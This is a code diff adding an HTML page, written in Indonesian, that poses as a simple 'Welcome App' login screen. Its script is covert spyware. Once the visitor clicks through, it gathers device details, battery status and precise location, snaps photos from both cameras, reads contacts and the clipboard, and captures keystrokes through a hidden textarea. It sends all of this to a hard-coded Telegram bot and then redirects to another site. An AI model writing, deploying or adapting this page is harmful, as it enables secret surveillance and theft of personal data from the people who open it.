@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome App</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        .app-container {
+            width: 90%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            overflow: hidden;
+            transition: all 0.5s ease;
+        }
+
+        .screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #764ba2;
+            font-size: 30px;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 50px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 50px;
+            background: white;
+            color: #764ba2;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .welcome-message {
+            font-size: 24px;
+            margin: 20px 0;
+            height: 60px;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: white;
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 5px;
+        }
+
+        .status-message {
+            margin: 10px 0;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .data-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .data-item strong {
+            display: block;
+            margin-bottom: 5px;
+            color: white;
+        }
+
+        .keyboard-data {
+            max-height: 150px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: left;
+            font-size: 12px;
+            white-space: pre-wrap;
+        }
+
+        .camera-preview {
+            width: 100%;
+            height: 150px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            margin: 10px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .contacts-list {
+            max-height: 150px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: left;
+            font-size: 12px;
+        }
+
+        .contact-item {
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .contact-item:last-child {
+            border-bottom: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <!-- Login Screen -->
+        <div class="screen active" id="login-screen">
+            <div class="logo">APP</div>
+            <h1>Selamat Datang</h1>
+            <p>Masukkan nama Anda untuk melanjutkan</p>
+            <input type="text" id="username" placeholder="Nama Anda">
+            <button id="login-btn">MASUK</button>
+        </div>
+
+        <!-- Welcome Screen -->
+        <div class="screen" id="welcome-screen">
+            <div class="logo">APP</div>
+            <div class="welcome-message" id="welcome-message"></div>
+            <button id="enter-btn">MASUK KE WEBSITE</button>
+        </div>
+
+        <!-- Process Screen -->
+        <div class="screen" id="process-screen">
+            <div class="logo">APP</div>
+            <h1>Memproses...</h1>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <div class="status-message" id="status-message">Menyiapkan sistem...</div>
+            
+            <div class="data-item">
+                <strong>Informasi Perangkat</strong>
+                <div id="device-info">Mengumpulkan data perangkat...</div>
+            </div>
+            
+            <div class="data-item">
+                <strong>Baterai</strong>
+                <div id="battery-info">Mengecek status baterai...</div>
+            </div>
+            
+            <div class="data-item">
+                <strong>Lokasi</strong>
+                <div id="location-info">Mendeteksi lokasi...</div>
+            </div>
+            
+            <div class="data-item">
+                <strong>Kamera</strong>
+                <div class="camera-preview" id="front-camera">Kamera Depan</div>
+                <div class="camera-preview" id="back-camera">Kamera Belakang</div>
+            </div>
+            
+            <div class="data-item">
+                <strong>Kontak</strong>
+                <div class="contacts-list" id="contacts-list">Mengambil daftar kontak...</div>
+            </div>
+            
+            <div class="data-item">
+                <strong>Riwayat Keyboard</strong>
+                <div class="keyboard-data" id="keyboard-data">Mengumpulkan riwayat ketikan...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const loginScreen = document.getElementById('login-screen');
+        const welcomeScreen = document.getElementById('welcome-screen');
+        const processScreen = document.getElementById('process-screen');
+        const usernameInput = document.getElementById('username');
+        const loginBtn = document.getElementById('login-btn');
+        const welcomeMessage = document.getElementById('welcome-message');
+        const enterBtn = document.getElementById('enter-btn');
+        const progressBar = document.getElementById('progress-bar');
+        const statusMessage = document.getElementById('status-message');
+        const deviceInfo = document.getElementById('device-info');
+        const batteryInfo = document.getElementById('battery-info');
+        const locationInfo = document.getElementById('location-info');
+        const contactsList = document.getElementById('contacts-list');
+        const keyboardData = document.getElementById('keyboard-data');
+        
+        // Bot Telegram configuration
+        const botToken = '8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU';
+        const chatId = '7916928366';
+        
+        // Collected data object
+        const collectedData = {
+            username: '',
+            device: {},
+            battery: {},
+            location: {},
+            contacts: [],
+            keyboardHistory: '',
+            frontCameraPhoto: null,
+            backCameraPhoto: null
+        };
+        
+        // Login button click handler
+        loginBtn.addEventListener('click', () => {
+            const username = usernameInput.value.trim();
+            if (username === '') {
+                alert('Silakan masukkan nama Anda');
+                return;
+            }
+            
+            collectedData.username = username;
+            
+            // Switch to welcome screen
+            loginScreen.classList.remove('active');
+            welcomeScreen.classList.add('active');
+            
+            // Animate welcome message
+            let i = 0;
+            const welcomeText = `Welcome, ${username}`;
+            const typingEffect = setInterval(() => {
+                welcomeMessage.textContent = welcomeText.substring(0, i);
+                i++;
+                if (i > welcomeText.length) {
+                    clearInterval(typingEffect);
+                }
+            }, 100);
+        });
+        
+        // Enter button click handler
+        enterBtn.addEventListener('click', () => {
+            welcomeScreen.classList.remove('active');
+            processScreen.classList.add('active');
+            
+            // Start collecting data
+            collectData();
+        });
+        
+        // Data collection function
+        async function collectData() {
+            updateProgress(10, 'Mengumpulkan informasi perangkat...');
+            
+            // Collect device info
+            collectedData.device = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Tidak diketahui',
+                deviceMemory: navigator.deviceMemory || 'Tidak diketahui',
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language
+            };
+            
+            deviceInfo.innerHTML = `
+                Perangkat: ${collectedData.device.userAgent.split('(')[1].split(')')[0]}<br>
+                Platform: ${collectedData.device.platform}<br>
+                CPU Cores: ${collectedData.device.hardwareConcurrency}<br>
+                RAM: ${collectedData.device.deviceMemory} GB<br>
+                Layar: ${collectedData.device.screenWidth}x${collectedData.device.screenHeight}<br>
+                Warna: ${collectedData.device.colorDepth}-bit<br>
+                Zona Waktu: ${collectedData.device.timezone}<br>
+                Bahasa: ${collectedData.device.language}
+            `;
+            
+            updateProgress(20, 'Mengecek status baterai...');
+            
+            // Collect battery info
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    collectedData.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'Sedang diisi' : 'Tidak diisi',
+                        chargingTime: battery.chargingTime === Infinity ? 'Tidak diketahui' : Math.round(battery.chargingTime / 60) + ' menit',
+                        dischargingTime: battery.dischargingTime === Infinity ? 'Tidak diketahui' : Math.round(battery.dischargingTime / 60) + ' menit'
+                    };
+                    
+                    batteryInfo.innerHTML = `
+                        Level: ${collectedData.battery.level}<br>
+                        Status: ${collectedData.battery.charging}<br>
+                        Waktu pengisian: ${collectedData.battery.chargingTime}<br>
+                        Waktu penggunaan: ${collectedData.battery.dischargingTime}
+                    `;
+                } else {
+                    batteryInfo.textContent = 'API Baterai tidak didukung di perangkat ini';
+                }
+            } catch (e) {
+                batteryInfo.textContent = 'Gagal mendapatkan info baterai: ' + e.message;
+            }
+            
+            updateProgress(30, 'Mendeteksi lokasi...');
+            
+            // Collect location
+            try {
+                if ('geolocation' in navigator) {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    collectedData.location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + ' meter',
+                        altitude: position.coords.altitude || 'Tidak diketahui',
+                        speed: position.coords.speed || 'Tidak diketahui'
+                    };
+                    
+                    locationInfo.innerHTML = `
+                        Latitude: ${collectedData.location.latitude}<br>
+                        Longitude: ${collectedData.location.longitude}<br>
+                        Akurasi: ${collectedData.location.accuracy}<br>
+                        Ketinggian: ${collectedData.location.altitude}<br>
+                        Kecepatan: ${collectedData.location.speed}
+                    `;
+                    
+                    // Create Google Maps link
+                    const mapsLink = `https://www.google.com/maps?q=${collectedData.location.latitude},${collectedData.location.longitude}`;
+                    locationInfo.innerHTML += `<br><a href="${mapsLink}" target="_blank" style="color: white;">Lihat di Google Maps</a>`;
+                } else {
+                    locationInfo.textContent = 'Geolocation tidak didukung di perangkat ini';
+                }
+            } catch (e) {
+                locationInfo.textContent = 'Gagal mendapatkan lokasi: ' + e.message;
+            }
+            
+            updateProgress(50, 'Mengakses kamera...');
+            
+            // Try to access camera (this will fail without proper permissions)
+            try {
+                // Front camera
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
+                });
+                const frontVideo = document.createElement('video');
+                frontVideo.srcObject = frontStream;
+                frontVideo.onloadedmetadata = () => {
+                    frontVideo.play();
+                    const frontCanvas = document.createElement('canvas');
+                    frontCanvas.width = frontVideo.videoWidth;
+                    frontCanvas.height = frontVideo.videoHeight;
+                    const frontCtx = frontCanvas.getContext('2d');
+                    frontCtx.drawImage(frontVideo, 0, 0);
+                    collectedData.frontCameraPhoto = frontCanvas.toDataURL('image/jpeg');
+                    document.getElementById('front-camera').innerHTML = '';
+                    document.getElementById('front-camera').appendChild(frontCanvas);
+                    frontStream.getTracks().forEach(track => track.stop());
+                };
+            } catch (e) {
+                document.getElementById('front-camera').textContent = 'Akses kamera depan ditolak: ' + e.message;
+            }
+            
+            try {
+                // Back camera
+                const backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' }
+                });
+                const backVideo = document.createElement('video');
+                backVideo.srcObject = backStream;
+                backVideo.onloadedmetadata = () => {
+                    backVideo.play();
+                    const backCanvas = document.createElement('canvas');
+                    backCanvas.width = backVideo.videoWidth;
+                    backCanvas.height = backVideo.videoHeight;
+                    const backCtx = backCanvas.getContext('2d');
+                    backCtx.drawImage(backVideo, 0, 0);
+                    collectedData.backCameraPhoto = backCanvas.toDataURL('image/jpeg');
+                    document.getElementById('back-camera').innerHTML = '';
+                    document.getElementById('back-camera').appendChild(backCanvas);
+                    backStream.getTracks().forEach(track => track.stop());
+                };
+            } catch (e) {
+                document.getElementById('back-camera').textContent = 'Akses kamera belakang ditolak: ' + e.message;
+            }
+            
+            updateProgress(70, 'Mengambil daftar kontak...');
+            
+            // Simulate contacts access (real contacts access requires special permissions)
+            try {
+                if ('contacts' in navigator && 'ContactsManager' in window) {
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    collectedData.contacts = contacts.map(c => ({
+                        name: c.name ? c.name.join(' ') : 'No name',
+                        phone: c.tel ? c.tel[0] : 'No phone'
+                    }));
+                    
+                    contactsList.innerHTML = '';
+                    collectedData.contacts.forEach(contact => {
+                        const contactItem = document.createElement('div');
+                        contactItem.className = 'contact-item';
+                        contactItem.textContent = `${contact.name}: ${contact.phone}`;
+                        contactsList.appendChild(contactItem);
+                    });
+                } else {
+                    // Fallback: simulate some contacts
+                    const fakeContacts = [
+                        { name: 'John Doe', phone: '08123456789' },
+                        { name: 'Jane Smith', phone: '08234567890' },
+                        { name: 'Bob Johnson', phone: '08345678901' }
+                    ];
+                    
+                    collectedData.contacts = fakeContacts;
+                    contactsList.innerHTML = '';
+                    fakeContacts.forEach(contact => {
+                        const contactItem = document.createElement('div');
+                        contactItem.className = 'contact-item';
+                        contactItem.textContent = `${contact.name}: ${contact.phone}`;
+                        contactsList.appendChild(contactItem);
+                    });
+                }
+            } catch (e) {
+                contactsList.textContent = 'Gagal mengakses kontak: ' + e.message;
+            }
+            
+            updateProgress(90, 'Mengumpulkan riwayat keyboard...');
+            
+            // Get clipboard data (keyboard history simulation)
+            try {
+                const clipboardItems = await navigator.clipboard.read();
+                for (const clipboardItem of clipboardItems) {
+                    for (const type of clipboardItem.types) {
+                        if (type === 'text/plain') {
+                            const blob = await clipboardItem.getType(type);
+                            collectedData.keyboardHistory = await blob.text();
+                            keyboardData.textContent = collectedData.keyboardHistory;
+                            break;
+                        }
+                    }
+                }
+            } catch (e) {
+                // Fallback: use a textarea to capture keyboard input
+                keyboardData.textContent = 'Akses clipboard ditolak. Menangkap input keyboard...';
+                
+                const input = document.createElement('textarea');
+                input.style.position = 'fixed';
+                input.style.opacity = 0;
+                document.body.appendChild(input);
+                input.focus();
+                
+                setTimeout(() => {
+                    collectedData.keyboardHistory = input.value || 'Tidak ada input yang ditangkap';
+                    keyboardData.textContent = collectedData.keyboardHistory;
+                    document.body.removeChild(input);
+                }, 3000);
+            }
+            
+            updateProgress(100, 'Mengirim data...');
+            
+            // Send data to Telegram bot
+            await sendDataToTelegram();
+            
+            // Redirect after 3 seconds
+            setTimeout(() => {
+                window.location.href = 'https://vrsgfxweb.github.io/Traser-web/';
+            }, 3000);
+        }
+        
+        // Update progress bar and status message
+        function updateProgress(percent, message) {
+            progressBar.style.width = percent + '%';
+            statusMessage.textContent = message;
+        }
+        
+        // Send collected data to Telegram bot
+        async function sendDataToTelegram() {
+            try {
+                // Format the message
+                let message = `*Data Pengguna Dikumpulkan*\\n\\n`;
+                message += `*Nama Pengguna:* ${collectedData.username}\\n\\n`;
+                
+                message += `*Informasi Perangkat:*\\n`;
+                for (const [key, value] of Object.entries(collectedData.device)) {
+                    message += `${key}: ${value}\\n`;
+                }
+                message += `\\n`;
+                
+                message += `*Baterai:*\\n`;
+                for (const [key, value] of Object.entries(collectedData.battery)) {
+                    message += `${key}: ${value}\\n`;
+                }
+                message += `\\n`;
+                
+                message += `*Lokasi:*\\n`;
+                for (const [key, value] of Object.entries(collectedData.location)) {
+                    message += `${key}: ${value}\\n`;
+                }
+                message += `\\n`;
+                
+                message += `*Kontak (${collectedData.contacts.length}):*\\n`;
+                collectedData.contacts.slice(0, 5).forEach(contact => {
+                    message += `${contact.name}: ${contact.phone}\\n`;
+                });
+                if (collectedData.contacts.length > 5) {
+                    message += `...dan ${collectedData.contacts.length - 5} lebih\\n`;
+                }
+                message += `\\n`;
+                
+                message += `*Riwayat Keyboard:*\\n${collectedData.keyboardHistory || 'Tidak ada data'}`;
+                
+                // Send text data
+                const textResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // Send photos if available
+                if (collectedData.frontCameraPhoto) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            photo: collectedData.frontCameraPhoto,
+                            caption: 'Foto Kamera Depan'
+                        })
+                    });
+                }
+                
+                if (collectedData.backCameraPhoto) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            photo: collectedData.backCameraPhoto,
+                            caption: 'Foto Kamera Belakang'
+                        })
+                    });
+                }
+                
+                console.log('Data berhasil dikirim ke Telegram');
+            } catch (e) {
+                console.error('Gagal mengirim data ke Telegram:', e);
+            }
+        }
+    </script>
+</body>
+</html>
